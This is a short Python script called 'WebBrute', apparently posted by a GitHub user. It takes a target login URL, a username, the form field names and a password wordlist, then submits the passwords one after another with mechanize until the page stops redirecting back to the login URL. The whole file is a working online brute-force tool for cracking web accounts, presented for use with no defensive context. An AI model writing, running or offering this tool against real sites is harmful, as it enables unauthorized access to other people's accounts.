import mechanize
import threading


print(
    """
    
    __        __   _     ____             _       
    \ \      / /__| |__ | __ ) _ __ _   _| |_ ___ 
     \ \ /\ / / _ \ '_ \|  _ \| '__| | | | __/ _ |
      \ V  V /  __/ |_) | |_) | |  | |_| | ||  __/ ~>WebBrute<~
       \_/\_/ \___|_.__/|____/|_|   \__,_|\__\___|~~>Made by tfwcodes(github)<~~
                                              

    
    """
)

url = input("Enter the url target: ")
username = input("Enter the username to crack: ")
form_uname = input("Enter the username input tag name: ")
password_form = input("Enter the password input tag name: ")
dictionary = input("Enter the name/path for the dictionary: ")
password_list = open(dictionary, "r")
passlist = password_list.read().splitlines()

def brute():
    br = mechanize.Browser()

    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)

    br.open(url)


    for x in passlist:
        br.select_form(nr=0)
        br.form[''.join(form_uname)] = username
        br.form[''.join(password_form)] = x
        resp = br.submit()

        if resp.geturl() == url:
            print("Incorect password: " + x)
        else:
            print("Password found: " + x)
            break


threads = []

new_thread = threading.Thread(target=brute)
new_thread.daemon = True

threads.append(new_thread)

new_thread.start()

# Join all thread
for thread in threads:
    thread.join()

